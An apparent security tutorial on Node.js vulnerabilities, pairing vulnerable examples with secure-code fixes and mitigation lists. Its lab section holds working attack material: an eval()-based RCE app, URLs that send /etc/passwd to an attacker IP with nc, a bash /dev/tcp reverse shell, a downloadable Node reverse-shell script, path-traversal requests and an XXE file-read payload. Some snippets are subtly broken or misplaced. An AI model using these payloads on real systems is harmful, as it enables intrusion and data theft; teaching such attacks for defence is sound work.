# NodeJS Security Principles
Basic NodeJS fundamentals that shows why some NodeJS vulnerabilities exist and how they can be exploited to gain remote code execution. Includes general code examples of secure code to mitigate some of the most well known exploitation tactics and methods

Node.js is an open-source, cross-platform, back-end, JavaScript runtime environment that executes JavaScript code outside a web browser.

Code injection is a specific form of broad injection attacks, in which an attacker can send JavaScript or Node.js code that is interpreted by the browser or the Node.js runtime. The security vulnerability manifests when the interpreter is unable to make a distinction between the trusted code the developer intended, and the injected code that the attacker provided as an input.

NodeJS "child_process" allow the application to create a child process and access the underlying operating system functionalities by running any system command inside the child process

There are four different ways to create a child process in Node:

- spawn()
- fork()
- exec()
- execFile()

child_process.exec() = Used to spawn a shell and execute system level command. It stores output in a buffer , used by developers when not expecting large amounts of data to be returned

child_process.spawn() = Function executes a command in a new process. Used by developers when expecting a large amount of output from your command

Abused language constructs in NodeJS

- eval() - Enables Code Execution (RCE)
- process.cwd() - Shows the current working directory of the NodeJS process (Information Disclosure)
- fs.readFile() - Reads a file on the server (Data Exfiltration/LFI)
- fs.writeFile() - Writes a new file with content (File Manipulation/Creation of malicious file with malicious code)
- unserialize() - Deserializes an object (Could contain malicious code embedded in the object for code execution


If any user input is passed to any of the above functions , it could potentially be abused to gain code execution. Some of the NodeJS functions might be required for the application to function, the key is to never allow the user the control the application execution flow by manipulating the expected input. 

Basic Lab Setup

Victim IP   ::: 192.168.10.100

Attacker IP ::: 192.168.10.10

Make sure to replace the attacker ip where necessary to get the call back to your system

Victim 

Installing package dependencies
```
apt-get install nodejs
apt install nodejs-legacy
apt-get install npm
npm install express

```
The below NodeJS app is vulnerable to RCE becuase it takes user input and passes it directly to the eval() function without validating the user input

Create new file called app.js with the below content
```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q)); // public supplied user input being processed by eval()
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('app listening on port 8080!');
});
```
Run the app
```
node app.js
```

Open the app
```
http://192.168.10.100:8080
```
Attacker

Pass it user input
```
http://192.168.10.100:8080/?q='Test'
```

Exfiltrate the /etc/passwd file of the remote system

```
http://192.168.10.100:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+192.168.10.10+9999')
```

Obtain Reverse Shell (Method 1)

Inject RCE inside URL 
```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.10.10/9999 0>%261"')
nc -lvnp 9999
```
Obtain Reverse Shell (Method 2)

Inject RCE to go and download the reverse shell from your machine and then execute it locally by invoking node

Create NodeJS reverse shell - Code below and save to a file called shell.js

Replace IP and Port 
```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9999, "192.168.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; 
})();
```
Create a local webserver hosting shell.js
```
python3 -m http.server 9000
```
Start a listener
```
nc -lvnp 443
```
Trigger RCE and get reverse shell
```
http://192.168.10.100:8080/?q=require("child_process").exec('bash -c "wget http://192.168.10.10:9000/shell.js; node shell.js"')
```
Securing the vulnerable app with simple code modification. The below code is the same code but it is not vulnerable to RCE becuase the eval() function has been removed and was replaced with the variable that contains the user-input and outputs it as text, instead of evaluating the user input as code and displaying the result of the code execution
```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send(`Hello ${req.query.q}`);  // eval() removed and replaced by the proper variable that does not allow code execution
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('app listening on port 8080!');
});

```

NodeJS LFI (Local File Inclusion)

Sample Code
```
var fs = require('fs');
var http = require('http');
http.createServer(function (req, res) {
	  res.writeHead(200, {'Content-Type': 'text/html'});
	  if (req.url === '/') { 
		  fs.readFile('./index.html', function(err, data){ // Not validating which files are allowed to be included in the fs.readFile() function
			  res.end(data);
			});
		  } else { 
			  fs.readFile('./'+req.url, function (err, data) { 
		      		//if (err) throw err;
		        	res.end(data); 
				console.log(req.url); 
	    		  });
		  }
}).listen(3000, '127.0.0.1');
console.log('Server running at http://127.0.0.1:3000/');
```
Trigger the LFI without encoding
```
curl http://127.0.0.1:8000/../../../../../../etc/passwd
```
Trigger the LFI with encoding (Attempt to bypass filters)
```
curl http://127.0.0.1:8000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..etc%2fpasswd
```
# How to prevent NodeJS attacks

- Never accept user input from the public and pass it to any fucntion that has the ability to interact with the underlying operating system
- Ensure to perform proper front-end user sanitization in all fields/forms that accept user supplied input (Regex or Array to limit user input to only allowed data)
- Ensure to limit user input to be more static-centric , rather than dynamic-centric. When user input is too dynamic , it increases the attack surface of the web application
- Block the following metacharacters to reduce the attack surface and limit user input. These metacharacters are abused for code execution. & ; ` ' \ " | * ? ~ < > ^ ( ) [ ] { } $ \n \r
- Use the shell-quote library to escape user input before it is processed by the web app
- Implement general input validation controls
- Perform output escaping
- Set request size limits
- Implement Express-bouncer, express-brute and rate-limiter modules to help mitigate brute-force attacks
- Implement CAPTCHAs to mitigate automated bots via the svg-captcha NodeJS module
- Use Anti CSRF Tokens via the Csurf NodeJS module
- Remove unnecessary API routes
- Prevent HPP (Prevent HTTP Parameter Pollution) attacks by using the hpp NodeJS module
- Ensure to implement general access control lists 
- Ensure to handle improper uncaughtException errors that could reveal confidential server-side information about the web application
- Implement secure HTTP header to help reduce the attack surface
- Use javaScript strict mode to block dangerous legacy features 


# Secure Code Development Examples

Secure Development Lifecycle (SDL) is the process of including security artifacts in the Software Development Lifecycle (SDLC) to help mitigate and remediate security vulnerabilities before any appication goes into production. Following secure coding practices help mitigate opportunistic threats from a foundational level , assisting the organization achieve financial stability from a business point of view and breach resistance from a technical perspective

Preventing the following attacks in NodeJS by applying secure coding standards

- Deserialization Vulnerabilities
- SQL / NoSQL Injections
- XML Attacks
- XSS Attacks
- Preventing Brute Force Attacks
- Implementing CAPTCHAs
- Implementing Cross-Site Request Forgery (CSRF) Token
- Preventing (HTTP Parameter Pollution(HPP) 
- Secure Cookies - Preventing Cookie Hijacking

# SQL / NoSQL Injection Attacks

Vulnerable Code Example (SQL / NoSQL Injection Attacks)
```
const db = require('./db');
app.get('/users', (req, res) => {
  db.query('SELECT * FROM Users WHERE UserID = ' + req.query.id);
    .then((users) => {
      ...
      res.send(users);
    })
});
```
The code below is susceptible to an injection attack because user input is not sanitised and passed directly into the query. If the attacker passes in 200 OR 1=1 as req.query.id, The system will return all the rows from the Users table because of the RHS (right-hand side) of the OR command which evaluates as TRUE.

A secure way of preventing injection attacks is by sanitising/validating inputs coming from the user. Writing a validation rule that only accepts a value of type int will help prevent an injection attack.

Using prepared statements or parameterised inputs can also help to prevent injection attacks because then inputs are treated as inputs and not part of an SQL statement to be executed.

Although the MySQL for Node package doesn't currently support parametrised inputs, Injection attacks can be prevented by escaping user inputs, secure code below

Secure Code (Preventing SQL / NoSQL Injection Attacks)
```
...
let sql_query    = 'SELECT * FROM users WHERE id = ' + connection.escape(req.query.id);
connection.query(sql_query, function (error, results, fields) {
  if (error) throw error;
  // ...
});
...
```

# XML Attacks

Vulnerable Code Example
```
<?xml version="1.0" encoding="ISO-8859-1"?>
   <email>sammy@domain.com</email>
</xml>
```
The XML Attack Code to Exfiltrate the /etc/passwd file
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY bar SYSTEM "file:///etc/passwd" >]>
   <email>sammy@domain.com</email>
   <foo>&bar;</foo>
</xml>
```
XML external entities attack is an attack in which XML processors are tricked into allowing data from external or local resources. Older XML processors by default allow the specification of an external entity (i.e. a URI which is evaluated during XML processing).

A successful XXE injection attack can seriously compromise the application which it's performed on and its underlying server
Disallowing document type definitions (DTD) is a strong defence against XXE injections attacks

Secure Code (Preventing XML Attacks)
```
//npm install libxmljs
var libxml = require("libxmljs");
var parserOptions = {
    noblanks: true,
    noent: false,
    nocdata: true
};
try {
    var doc = libxml.parseXmlString(data, parserOptions);
} catch (e) {
    return Promise.reject('Xml parsing error');
```

# XSS Attacks

```
..
app.get('/search', (req, res) => {
  const results = db.search(req.query.product);
  if (results.length === 0) {
    return res.send('<p>No results found for "' + req.query.product + '"</p>');
  }
...
}); 
```
Server XSS occurs when untrusted input coming from the client-side is accepted by the backend for processing/storage without proper validation. Such data, when used to compute the response to be sent back to the user, may contain executable malicious javascript code
A malicious user can easily inject the following code above as req.query.product

Malicious Code
```
<script>alert("Hacked")</script>
```
Implementing XSS filter can prevent these types of untrusted data form being processed

Secure Code Example (Preventing XSS Attacks)
```
// npm install xss-filters --save
var xssFilters = require('xss-filters');
...
app.get('/search', (req, res) => {
  const results = db.search(req.query.product);
  if (results.length === 0) {
    return res.send('<p>No results found for "' +
       xssFilters.inHTMLData(req.query.product) + 
    '"</p>');
  }
});  
...

  res.render('send', { csrfToken: req.csrfToken() })
})
app.post('/process', parseForm, csrfProtection, function (req, res) {
  res.send('data is being processed')
})
// views/forms.html
  <form action="/process" method="POST">
    ...
    <input type="hidden" name="_csrf" value="{{ csrftoken }}">
   ...
  </form>
```

# Preventing Brute Force Attacks

We can prevent brute force attacks by implementing built in Node JS modules such as Express-bouncer, express-brute and rate-limiter

Secure Code Example (Preventing Burte-Force Attacks) - Express-bouncer
```
var bouncer = require('express-bouncer');
bouncer.whitelist.push('127.0.0.1'); // whitelist an IP address
// give a custom error message
bouncer.blocked = function (req, res, next, remaining) {
    res.send(429, "Too many requests have been made. Please wait " + remaining/1000 + " seconds.");
};
// route to protect
app.post("/login", bouncer.block, function(req, res) {
    if (LoginFailed){  }
    else {
        bouncer.reset( req );
    }
});
```
Secure Code Example (Preventing Burte-Force Attacks) - Express-brute
```
var ExpressBrute = require('express-brute');

var store = new ExpressBrute.MemoryStore(); // stores state locally, don't use this in production
var bruteforce = new ExpressBrute(store);

app.post('/auth',
    bruteforce.prevent, // error 429 if we hit this route too often
    function (req, res, next) {
        res.send('Success!');
    }
);
```
Secure Code Example (Preventing Burte-Force Attacks) - Rate-limiter
```
var limiter = new RateLimiter();
limiter.addLimit('/login', 'GET', 5, 500); // login page can be requested 5 times at max within 500 seconds
```
# Implementing CAPTCHAs

```
var svgCaptcha = require('svg-captcha');
app.get('/captcha', function (req, res) {
    var captcha = svgCaptcha.create();
    req.session.captcha = captcha.text;
    res.type('svg');
    res.status(200).send(captcha.data);
});
```
# Implementing Cross-Site Request Forgery (CSRF) Token

Cross-Site Request Forgery (CSRF) aims to perform authorized actions on behalf of an authenticated user, while the user is unaware of this action. CSRF attacks are generally performed for state-changing requests like changing a password, adding users or placing orders. Csurf is an express middleware that can be used to mitigate CSRF attacks

Secure Code

Inside your web application
```
var csrf = require('csurf');
csrfProtection = csrf({ cookie: true });
app.get('/form', csrfProtection, function(req, res) {
    res.render('send', { csrfToken: req.csrfToken() })
})
app.post('/process', parseForm, csrfProtection, function(req, res) {
    res.send('data is being processed');
});
```
Inside your HTML Page
```
<input type="hidden" name="_csrf" value="">
```
# Preventing (HTTP Parameter Pollution(HPP) 

HTTP Parameter Pollution(HPP) is an attack in which attackers send multiple HTTP parameters with the same name and this causes your application to interpret them in an unpredictable way. When multiple parameter values are sent, Express populates them in an array. In order to solve this issue, you can use hpp module

Secure Code
```
var hpp = require('hpp');
app.use(hpp());
```
# Secure Cookies - Preventing Cookie Hijacking

Generally, session information is sent using cookies in web applications. However, improper use of HTTP cookies can render an application to several session management vulnerabilities. There are some flags that can be set for each cookie to prevent these kinds of attacks. httpOnly, Secure and SameSite flags are very important for session cookies. httpOnly flag prevents the cookie from being accessed by client-side JavaScript. This is an effective counter-measure for XSS attacks. Secure flag lets the cookie to be sent only if the communication is over HTTPS. SameSite flag can prevent cookies from being sent in cross-site requests which helps protect against Cross-Site Request Forgery (CSRF) attacks. Apart from these, there are other flags like domain, path and expires. Setting these flags appropriately is encouraged, but they are mostly related to cookie scope not the cookie security

Secure Code
```
var session = require('express-session');
app.use(session({
    secret: 'your-secret-key',
    key: 'cookieName',
    cookie: { secure: true, httpOnly: true, path: '/user', sameSite: true}
}));
```







